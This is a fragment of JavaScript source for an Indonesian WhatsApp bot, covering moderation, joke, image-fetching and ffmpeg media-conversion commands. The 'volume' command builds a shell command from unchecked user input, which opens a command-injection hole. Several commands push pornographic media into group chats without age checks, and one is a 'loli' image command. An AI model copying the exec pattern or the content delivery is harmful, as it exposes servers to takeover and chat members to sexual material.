await xdev.groupParticipantsUpdate(from, [input], 'promote').then((res) => setReply(`Sukses Promote ${input.split("@")[0]}`)).catch((err) => setReply(jsonformat(err)))
}
break 
case 'kickme':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
await xdev.groupParticipantsUpdate(from, [sender], 'remove')
await setReply("Done wkwkw")
} catch (err){
setReply(`${err}`)
}
break
case 'banchat':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!isGroup) return onlyGroup() 
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if (isBanchat) return setReply(`udah di ban`)
addDataId(from, command, DataId)
setReply(`Bot berhasil Ban di group ini`)
}
break
case 'unbanchat':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
try {
if (!isBanchat) return setReply(`udah di UnBan`)
removeDataId ("banchat", from, DataId)
setReply(`Bot telah di Unban di group ini`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break
case 'ban':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (cekBannedUser(input)) return setReply("Udah di ban kak")
addBanned(pushname, calender, input, ban)         
setReply(`Berhasil banned ${input.split("@")[0]}`)
break
case 'unban':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!cekBannedUser(input)) return setReply("Udah di unban kak")
unBanned(input, ban)             
setReply(`Berhasil unbanned ${input.split("@")[0]}`);
break
case 'getppgc':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
onlyWait()
try {
var ppimg = await xdev.profilePictureUrl(from, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await xdev.sendMessage(from, { image: { url: ppimg }}, { quoted: setQuoted })
break 
case 'getpp':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (isGroup) { 
if (mentionByTag){
console.log(mentionByTag[0])
try {
var ppimg = await xdev.profilePictureUrl(mentionByTag[0],"image")
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await xdev.sendMessage(from, { caption: "Nih", image: { url: ppimg }}, { quoted: setQuoted })
} else if (mentionByReply){
try {
var ppimg = await xdev.profilePictureUrl(mentionByReply, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await xdev.sendMessage(from, { contextInfo: { forwardingScore: 2, isForwarded: true },caption: "Nih", image: { url: ppimg }}, { quoted: setQuoted })
} 
} else if(!isGroup){
try {
var ppimg = await xdev.profilePictureUrl(from, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await xdev.sendMessage(from, {caption: "Nih",  image: { url: ppimg }}, { quoted: setQuoted })
}
break
case 'listonline': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
xdev.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, setQuoted, { mentions: online })
}
break
case 'getname':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(isGroup) {
console.log(users)
const sname = await xdev.getName(users)
setReply(sname)
} else if(!isGroup) {
const yahu = await xdev.getName(users)
setReply(yahu)
} else{
setReply("Reply targetnya")
}
break
//━━━━━━━━━━━━━━━[ FUN ]━━━━━━━━━━━━━━━━━//
case 'cekbapak':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
const cek = bapak[Math.floor(Math.random() * bapak.length)]
setReply(cek)
break
case 'truth':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
setReply(ttrth) 
break
case 'dare':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
setReply(der) 
break
case 'katailham':  
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const afa = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
xdev.sendMessage(from, { text: ''+afa+'\n\n_-Ilham._'}, { quoted: setQuoted })
break
case 'bucin':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
xdev.sendMessage(from, { text: ''+sa+'\n\n_-BUCIN._'}, { quoted: setQuoted })
break
case 'bisakah':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const bisakah = body.slice(1)
const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh }, { quoted: setQuoted })
break
case 'kapankah':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const kapankah = body.slice(1)
const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh}, { quoted: setQuoted })
break
case 'apakah':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const apakah = body.slice(1)
const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
const kah = apa[Math.floor(Math.random() * apa.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah}, { quoted: setQuoted })
break
case 'bagaimanakah':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const bagaimanakah = body.slice(1)
const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
const mana = bagai[Math.floor(Math.random() * bagai.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana}, { quoted: setQuoted })
break													
case 'goblokcek': case 'jelekcek': case 'gaycek':case 'rate':
case 'lesbicek':case 'gantengcek': case 'cantikcek':case 'begocek': case 'suhucek':case 'pintercek':
case 'jagocek':case 'nolepcek':case 'babicek':case 'bebancek':case 'baikcek':
case 'jahatcek':case 'anjingcek':case 'haramcek':case 'pakboycek':
case 'pakgirlcek':case 'sangecek': case 'bapercek':case 'fakboycek':case 'alimcek':case 'suhucek':
case 'fakgirlcek':case 'kerencek':case 'wibucek':case 'pasarkascek':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const cex = body.slice(1)
const cek1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+cex+'*\n\nJawaban : '+ cek2+'%'}, { quoted: setQuoted })
break			
case 'watakcek': case 'cekwatak':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const watak = body.slice(1)
const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
const tak = wa[Math.floor(Math.random() * wa.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak}, { quoted: setQuoted })
break				
case 'hobbycek': case 'cekhobby':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const hobby = body.slice(1)
const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by}, { quoted: setQuoted })
break
//━━━━━━━━━━━━━━━[ RANDOM ]━━━━━━━━━━━━━━━━━//
case 'cecan': 
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
xdev.sendMessage(from, { caption: "Random Cewe Cantik", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: setQuoted })
break
case 'cogan': 
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
var query = ["cogan hd","cogan indo","cowo ganteng","handsome boy","hot boy","oppa","cowo aesthetic","cogan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
xdev.sendMessage(from, { caption: "Random Cowo Ganteng", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: setQuoted })
break 					
case 'anime':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
await fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
imageToBase64(pjr)
.then((response) => {
media =  Buffer.from(response, 'base64');
xdev.sendMessage(from,{ image: media,caption:'NIH' },{quoted:setQuoted})
}
)
.catch((error) => {
console.log(error); 
}
)
});
break
case 'bokep':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return reply('Di Group Aj Biar Dosanya Makin Gede')
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
xdev.sendMessage(from, { video: {url : `${bokep}`}, caption:`Nih Kak`, mimetype: 'video/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'loli': case 'milf': case 'husbu': case 'cosplay': case 'wallml':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let kentir = await getBuffer(wipi)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]                            
xdev.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
case 'wallpapers':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let link =`https://megayaa.herokuapp.com/api/akaneko/wallpapers`
let nana = await getBuffer(link)     
xdev.sendImage(from, nana, "Nih",setQuoted)
}
break
case 'wallpapermobile':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let link =`https://megayaa.herokuapp.com/api/akaneko/mobileWallpapers`
let nana = await getBuffer(link)     
xdev.sendImage(from, nana, "Nih",setQuoted)
}
break
case 'neko':
case 'waifu':
case 'trap':
case 'blowjob':{
if (!isDevoloper) return onlyPrem()
reply(mess.wait)
let ana = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]                            
xdev.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
case 'shinobu':
case 'megumin':
case 'bully':
case 'cuddle':
case 'cry':
case 'hug':
case 'awoo':
case 'kiss':
case 'lick':
case 'pat':
case 'smug':
case 'bonk':
case 'yeet':
case 'blush':
case 'smile':
case 'wave':
case 'highfive':
case 'handhold':
case 'nom':
case 'bite':
case 'glomp':
case 'slap':
case 'kill':
case 'happy':
case 'wink':{
if (!isDevoloper) return onlyPrem()
reply(mess.wait)
//if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)et
let ana = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]                            
xdev.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
case 'neko2':{
if (!isDevoloper) return onlyPrem()
reply(mess.wait)
//if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)et
let ana = await fetchJson(`https://api.waifu.pics/sfw/neko`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix}neko2`,buttonText:{displayText: `➡️Next`},type:1}]                            
xdev.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
case 'waifunime':{
if (!isDevoloper) return onlyPrem()
reply(mess.wait)
//if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let ana = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]                            
xdev.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
case 'hug2':{
if (!isDevoloper) return onlyPrem()
reply(mess.wait)
//if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let ana = await fetchJson(`https://nekos.life/api/v2/img/hug`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix}hug2`,buttonText:{displayText: `➡️Next`},type:1}]                            
xdev.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
//━━━━━━━━━━━━━━━[ COVERTER ]━━━━━━━━━━━━━━━━━//
case 'toimg': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isQuotedSticker) return setReply('Reply stickernya')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(err)
let buffer = fs.readFileSync(ran)
await xdev.sendMessage(from, {caption: "Nih", image: buffer})
fs.unlinkSync(ran)
})
}
break
case 'tomp3':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (isQuotedVideo) {
onlyWait()
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
} else {
setReply("Reply videonya")
}
break
case 'tomp4':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (isQuotedSticker) {
onlyWait()
let file = await xdev.downloadAndSaveMediaMessage(quoted)
let outGif = `./ACTION/PLICE/VIDEO/${getRandom('.gif')}`
let outMp4 = `./ACTION/PLICE/VIDEO/${getRandom('.mp4')}`
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}      
await xdev.sendMessage(from,{video: fs.readFileSync(outMp4), caption: "Nih"},{quoted: setQuoted})
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
}) 
}
break
case 'toptt':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (isQuotedAudio){
onlyWait()
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let topt = fs.readFileSync(ran)
await xdev.sendMessage(from,{audio: topt, mimetype: 'audio/mp4', ptt:true}, {quoted: setQuoted})
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio")
}
break
case 'togif':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if ( isQuotedSticker) {
onlyWait()
let file = await  xdev.downloadAndSaveMediaMessage(quoted)
let outGif = `./ACTION/PLICE/VIDEO/${getRandom('.gif')}`
let outMp4 = `./ACTION/PLICE/VIDEO/${getRandom('.mp4')}`
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}      
await sendGif(fs.readFileSync(outMp4))
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
}) 
} else if(isQuotedVideo){
onlyWait()
let outMp4 = getRandom('.mp4')
let file = await xdev.downloadAndSaveMediaMessage(quoted)
let nana = await fs.readFileSync(file)
await sendGif(nana)
await fs.unlinkSync(file)
}
break
case 'volume':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
if (isQuotedAudio){ 
onlyWait()
let media3 = await xdev.downloadAndSaveMediaMessage(quoted)
let rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
if (err) return setReply('Error!')
let jadie = fs.readFileSync(rname)
await xdev.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4', ptt: true }, {quoted: setQuoted})
fs.unlinkSync(rname)
fs.unlinkSync(media3)
}
)
} else {
setReply('Reply audio!')
}
break
case 'hode':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(isQuotedAudio) { 
onlyWait()
let medok = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medok)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'ghost':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(isQuotedAudio) { 
onlyWait()
let mele = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mele)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
}) 
} else {
setReply('Reply audionya')
}
break
case 'nightcore':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(isQuotedAudio) { 
onlyWait()
let mela = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mela)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'tupai':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(isQuotedAudio) { 
onlyWait()
let medoi = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
